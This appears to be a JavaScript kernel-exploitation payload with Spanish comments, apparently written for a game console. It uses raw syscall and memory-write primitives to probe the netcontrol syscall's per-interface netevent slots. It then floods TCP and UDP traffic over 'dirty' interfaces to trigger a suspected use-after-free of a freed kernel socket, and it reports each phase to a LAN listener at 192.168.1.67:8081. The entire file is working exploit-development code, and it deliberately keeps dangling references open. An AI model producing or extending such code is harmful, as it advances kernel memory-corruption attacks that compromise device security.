// 2026-08-28 netctl3_1320: MAPA de ESTADO netevents por interfaz + TRIGGER de trafico sobre interfaces SUCIAS. Base: netctl2_1320.js (canal W, helpers mk/nc, connects al listener 192.168.1.67:8081).
// TESIS post-netctl2: netctl2 hizo SET(ifx=0)->ok y close(s1) SIN clear exitoso (errno 5). El si_netevent de ifx=0 quedo LLENO con una ref a un socket LIBERADO (proceso muerto hace sesiones, file objeto liberado). Estado netevent vive en la kernel (ifnet) => PERSISTE entre sesiones de app. SET ahora falla en ifx=0 (errno 5 = slots llenos/sucios) pero ACEPTA en ifx=1,2,3. Si la kernel toca ne->socket (colgante) al procesar eventos de red de ifx sucio => UAF de un objeto liberado hace horas => crash REPRODUCIBLE entre sesiones.
// netcontrol = syscall(0x63n, ifx, cmd, buf, 8n); buf=malloc(8) con write64(fd). SET=0x20000003. errno 5 (EIO) = "no-match/slots sucios" (estado persistente). ok(ret>=0) = "slot LIBRE, netevent creado AHORA" (ref VIVA, dejar fd ABIERTO).
// FASE1 mapa por ifx[0..3] -> FASE2 trafico (100 TCP connect+send + 50 UDP sendto al listener, W cada 10) sobre ifx SUCIOS -> FASE3 re-mapa -> FASE4 F1-vivos QUEDAN ABIERTOS, cerrar solo canal W. Sin mmap/thr_new/rfork/read64. Bucles acotados (~300 ops). <7KB.
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const NCX=0x63n,SETQ=0x20000003n,YIELD=331n,IFX=[0,1,2,3];
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa,16n))<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
W("[netctl3] inicio - canal "+(sock>=0n?"OK":"MUERTO")+" - mapa netevent por ifx + trafico sucio");
// sockaddr del listener (reutilizado: TCP connect y UDP sendto) + buffer de datos
const SA=malloc(16);write8(SA,16);write8(SA+1n,2);write16(SA+2n,0x911Fn);write32(SA+4n,0x4301A8C0n);write64(SA+8n,0n);
const SB=malloc(64);for(let i=0;i<64;i++)write8(SB+BigInt(i),65+i%26);
const SUM=[];
const mk=(t,i)=>{const fd=I(syscall(SYSCALL.socket,2n,1n,0n));W(t+": socket s"+i+" fd="+fd);return fd};
const B8=malloc(8);
const nc=(v,fd,ifx,cmd,d)=>{const p=v+": "+d+" (fd="+fd+") ifx=0x"+Number(ifx).toString(16);W(p+"...");write64(B8,fd);const r=I(syscall(NCX,B(ifx),cmd,B8,8n));const e=r<0?EN():0;W(p+" -> ret="+r+(r<0?" errno="+e:""));return{r,e}};
// pasa de mapa: SET por ifx[0..3]; ok=netevent VIVO (keep=>fd queda ABIERTO), err=>sucio (fd cerrado). Devuelve codes/vivos/sucios.
const mapPass=(tag,keep)=>{const codes=[],vivos=[],sucios=[];
 for(const x of IFX){const fd=mk(tag,0);
  if(fd<0n){W(tag+": ifx="+x+" socket FALLO");codes.push("sockfail");continue;}
  const q=nc(tag,fd,x,SETQ,"SET ifx="+x);
  if(q.r>=0n){codes.push("OK");W(tag+": ifx="+x+" -> OK slot LIBRE, netevent creado AHORA (ref VIVA fd="+fd+")"+(keep?" [DEJADO ABIERTO]":" [cerrado]"));if(keep)vivos.push(Number(fd));else syscall(SYSCALL.close,fd);}
  else{codes.push("e"+q.e);sucios.push(x);W(tag+": ifx="+x+" -> errno "+q.e+" SUCIO/LLENO (estado PERSISTENTE de sesiones previas)");syscall(SYSCALL.close,fd);}}
 W(tag+" MAPA -> ifx0="+codes[0]+" ifx1="+codes[1]+" ifx2="+codes[2]+" ifx3="+codes[3]);
 return{codes,vivos,sucios};};
// ===== FASE 1: mapa de estado por interfaz =====
let m1={codes:["?","?","?","?"],vivos:[],sucios:[]};
try{W("== FASE 1: MAPA de estado netevent por ifx (SET por interfaz) ==");
 N("[netctl3] FASE1 mapeando ifx0..3 (errno5=sucio/persistente, ok=slot libre)");
 m1=mapPass("F1",true);
 SUM.push("MAPA1=["+m1.codes.join(" ")+"] vivos=["+m1.vivos.join(",")+"] sucios=["+m1.sucios.join(",")+"]");
 N("[netctl3] MAPA1 ifx0..3=["+m1.codes.join(",")+"]");
}catch(e){W("FASE1 EX: "+e);SUM.push("MAPA1 EX")}
// ===== FASE 2: trigger de trafico sobre interfaces SUCIAS (crash = UAF real) =====
let traficoOK=false,okT=0,okU=0;
try{
 const dirty=m1.sucios.length?m1.sucios.join(","):"(ninguno)";
 W("== FASE 2: TRAFICO sobre ifx SUCIOS ["+dirty+"] ==");
 N("[netctl3] TRAFICO sobre ifx sucios: si la consola crashea, el colgante es real (UAF)");
 // 100 TCP connect+send+close en loops de 10 (W progreso cada 10)
 for(let g=1;g<=10;g++){
  for(let k=0;k<10;k++){const c=I(syscall(SYSCALL.socket,2n,1n,0n));if(c<0n)continue;
   if(I(syscall(SYSCALL.connect,c,SA,16n))>=0n){syscall(SYSCALL.sendto,c,SB,16n,0n,0n,0n);okT++;}
   syscall(SYSCALL.close,c);}
  W("[netctl3] FASE 2 TCP "+(g*10)+"/100 VIVA (connect+send ok="+okT+")");
  for(let j=0;j<20000;j++)syscall(YIELD);}
 // 50 UDP sendto al listener (variedad de eventos de red)
 W("[netctl3] FASE 2 UDP: 50 sendto a 192.168.1.67:8081");
 for(let u=1;u<=50;u++){const d=I(syscall(SYSCALL.socket,2n,2n,0n));if(d<0n)continue;
  if(I(syscall(SYSCALL.sendto,d,SB,16n,0n,SA,16n))>=0n)okU++;
  syscall(SYSCALL.close,d);
  if(u%10===0){W("[netctl3] FASE 2 UDP "+u+"/50 VIVA (sendto ok="+okU+")");for(let j=0;j<10000;j++)syscall(YIELD);}}
 traficoOK=true;
 W("[netctl3] FASE 2: SOBREVIVIO al trafico (TCP "+okT+"/100, UDP "+okU+"/50) -> colgante NO toco evento O no habia colgante en la ruta");
 SUM.push("TRAFICO TCP="+okT+"/100 UDP="+okU+"/50 SOBREVIVIO");
}catch(e){W("FASE2 EX (posible crash/inestabilidad): "+e);SUM.push("TRAFICO EX")}
// ===== FASE 3: segundo mapa (el estado cambio tras el trafico?) =====
let m2={codes:["?","?","?","?"],vivos:[],sucios:[]};
try{W("== FASE 3: RE-MAPA tras el trafico (sockets de paso, todos cerrados) ==");
 m2=mapPass("F3",false);
 SUM.push("MAPA2=["+m2.codes.join(" ")+"] sucios=["+m2.sucios.join(",")+"]");
}catch(e){W("FASE3 EX: "+e);SUM.push("MAPA2 EX")}
// ===== FASE 4: veredicto (F1-vivos QUEDAN ABIERTOS) =====
try{
 const camb=m1.codes.join()!==m2.codes.join();
 W("== FASE 4: RESUMEN ==");for(const l of SUM)W("  "+l);
 W("[netctl3] F1 netevents VIVOS ["+m1.vivos.join(",")+"] -> DEJADOS ABIERTOS (solo se cierra el canal W)");
 const vt=(camb?"estado CAMBIO tras trafico ["+m1.codes.join("|")+" -> "+m2.codes.join("|")+"]":"estado IGUAL tras trafico")
  +", sucios1=["+(m1.sucios.length?m1.sucios.join("/"):"-")+"]"
  +", "+(traficoOK?"consola VIVA":"NO completo trafico")+", F1vivos="+m1.vivos.length;
 const vrd=("[netctl3] VEREDICTO: "+vt).slice(0,120);
 W(vrd);N(vrd);
 if(m1.sucios.length&&traficoOK)W("[netctl3] NOTA: hubo trafico sobre ifx sucios y la consola NO crasheo -> o el colgante no se toca en esta ruta o el slot ya se reciclo");
}catch(e){W("FASE4 EX: "+e)}
W("[netctl3] cleanup: cierre SOLO canal W (netevents F1-vivos siguen abiertos)");
W("PAYLOAD DONE");
for(let i=0;i<30;i++){N("[netctl3] vivo "+(30-i));for(let j=0;j<3000;j++)syscall(YIELD)}
try{if(sock>=0n)syscall(SYSCALL.close,sock)}catch(e){}
})();
